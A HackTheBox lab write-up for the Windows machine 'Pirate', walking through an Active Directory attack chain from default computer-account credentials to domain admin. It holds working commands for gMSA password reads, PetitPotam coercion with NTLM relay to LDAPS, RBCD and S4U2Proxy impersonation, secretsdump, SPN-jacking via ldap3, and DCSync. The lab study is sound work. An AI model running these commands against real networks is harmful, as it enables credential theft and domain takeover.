---
title: "Pirate — HackTheBox Writeup"
date: "2026-03-01"
description: "Hard Windows machine involving Pre-Windows 2000 computer accounts, gMSA password reads, PetitPotam NTLM relay to LDAPS for RBCD, and SPN-jacking for DCSync"
tags: ['hackthebox', 'writeup', 'windows', 'active directory', 'hard', 'ntlm relay', 'kerberos', 'delegation']
thumbnail: ""
---

# Pirate — HTB Labs Machine Writeup

**Difficulty:** Hard
**OS:** Windows Server 2019
**Domain:** pirate.htb

---

## Attack Chain Summary

```
Pre2k MS01$ (password=ms01) → gMSA password read
    → gMSA_ADFS_prod$ WinRM on DC01 → Ligolo pivot to WEB01
        → PetitPotam coerce WEB01 → NTLM relay to LDAPS → RBCD on WEB01$
            → S4U2Proxy → Administrator@CIFS/WEB01 → LSA secrets dump
                → a.white DefaultPassword → ForceChangePassword → a.white_adm
                    → SPN-jacking (HTTP/WEB01: WEB01$ → DC01$)
                        → S4U2Proxy → ccache sname rewrite → DCSync → DA
```

---

## Phase 1: Reconnaissance

### Network Topology

```
DC01 (pirate.htb) — 10.129.4.87 (ext) / 192.168.100.1 (int)
WEB01 (internal ADFS) — 192.168.100.2 (only reachable via DC01 pivot)
```

### Port Scan (DC01)

Standard Windows DC ports: DNS (53), HTTP (80), Kerberos (88), LDAP (389/636), SMB (445), WinRM (5985), plus HTTPS (443) and vmrdp (2179).

- **SMB signing**: required (relay to SMB ruled out, LDAPS relay still viable)
- **Clock skew**: +7 hours (manual sync required for Kerberos)

### AD Enumeration Highlights

- **2 gMSA accounts**: `gMSA_ADCS_prod$`, `gMSA_ADFS_prod$`
- **Pre-Windows 2000 computer**: `MS01$` (member of "Domain Secure Servers" group)
- **a.white_adm**: Constrained delegation to `HTTP/WEB01` with protocol transition + WriteSPN on both WEB01$ and DC01$
- **a.white**: ForceChangePassword over `a.white_adm`

---

## Phase 2: Pre-Windows 2000 Account → gMSA

Pre-Windows 2000 compatible computer accounts have a predictable default password matching the lowercase machine name:

```bash
getTGT.py pirate.htb/'MS01$':ms01 -dc-ip 10.129.4.87
```

MS01$ is in "Domain Secure Servers" — can read gMSA passwords:

```bash
bloodyAD -d pirate.htb -u 'MS01$' -p 'ms01' --host 10.129.4.87 \
  -k pirate.htb get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword
```

**gMSA_ADFS_prod$** had WinRM access on both DC01 and WEB01.

---

## Phase 3: Pivot + PetitPotam + RBCD

### Ligolo Pivot

WinRM to DC01 as gMSA_ADFS_prod$, then ligolo-ng tunnel to reach 192.168.100.0/24.

### PetitPotam + NTLM Relay

Coerce WEB01's machine account auth via PetitPotam, relay to LDAPS on DC01 to set RBCD:

```bash
# Terminal 1: NTLM Relay
ntlmrelayx.py -t ldaps://10.129.4.87 --delegate-access \
  --escalate-user 'MS01$' --remove-mic -smb2support

# Terminal 2: PetitPotam coercion
python3 PetitPotam.py -u 'gMSA_ADFS_prod$' \
  -hashes :<redacted> -d pirate.htb \
  ATTACKER_IP 192.168.100.2
```

### S4U2Proxy → Administrator on WEB01

```bash
getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator \
  pirate.htb/MS01$:ms01 -dc-ip 10.129.4.87
```

---

## Phase 4: LSA Secrets → Credential Chain

```bash
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass WEB01.pirate.htb -target-ip 192.168.100.2
```

**DefaultPassword discovered**: `a.white:<redacted>` (Windows auto-logon LSA secret).

Then: `a.white` → ForceChangePassword → `a.white_adm` → password reset.

---

## Phase 5: SPN-Jacking → DCSync

The core privilege escalation. `a.white_adm` has:
1. **Constrained delegation** to `HTTP/WEB01` (with protocol transition)
2. **WriteSPN** on both WEB01$ and DC01$

### The Attack

1. Remove `HTTP/WEB01` SPN from WEB01$
2. Add `HTTP/WEB01` SPN to DC01$
3. S4U2Proxy — KDC issues ticket encrypted with DC01's key (since SPN now belongs to DC01$)
4. Rewrite unencrypted sname field in ccache: `HTTP/WEB01` → `cifs/DC01.pirate.htb`
5. DCSync with the rewritten ticket

```python
# SPN move via ldap3
c.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_DELETE,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
c.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_ADD,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
```

```bash
# S4U2Proxy with SPN now on DC01
getST.py -spn HTTP/WEB01 -impersonate Administrator \
  pirate.htb/a.white_adm:'<redacted>' -dc-ip 10.129.4.87

# Rewrite ticket sname, then DCSync
secretsdump.py -k -no-pass DC01.pirate.htb -dc-ip 10.129.4.87 \
  -just-dc-user Administrator
```

Domain Administrator NTLM hash obtained. Pass-the-hash for root flag.

---

## Key Takeaways

1. **Pre-Windows 2000 accounts are free credentials** — Default password = lowercase machine name. Always check early.

2. **gMSA accounts can be overprivileged** — gMSA_ADFS_prod$ had WinRM admin on both DC01 and WEB01.

3. **NTLM relay to LDAPS bypasses SMB signing** — When SMB signing is required, LDAPS relay works.

4. **LSA DefaultPassword stores autologon credentials in cleartext** — Always check when dumping servers.

5. **WriteSPN + constrained delegation = SPN-jacking** — A powerful and underrated AD attack path. Move the delegated SPN to a higher-privilege machine, get a ticket encrypted with that machine's key.

6. **ccache sname is unencrypted** — Can be freely rewritten to change the target service class.

7. **Clock skew on macOS** — Kerberos requires within 5 minutes; manual sync needed with `sudo date -u`.

---

## Tools Used

- `rustscan` / `nmap` — Port scanning
- `bloodyAD` — AD object manipulation (gMSA, ForceChangePassword)
- `getTGT.py` / `getST.py` — Kerberos TGT/TGS, S4U2Self/S4U2Proxy
- `ntlmrelayx.py` — NTLM relay to LDAPS for RBCD
- `PetitPotam.py` — MS-EFSRPC coercion
- `secretsdump.py` — SAM/LSA/NTDS dump + DCSync
- `ligolo-ng` — Network pivoting
- `nxc` (NetExec) — Multi-protocol credential validation
- `evil-winrm` — Interactive WinRM shell
- Python `ldap3` — LDAP modification for SPN-jacking
- Impacket CCache — Kerberos ticket sname rewriting
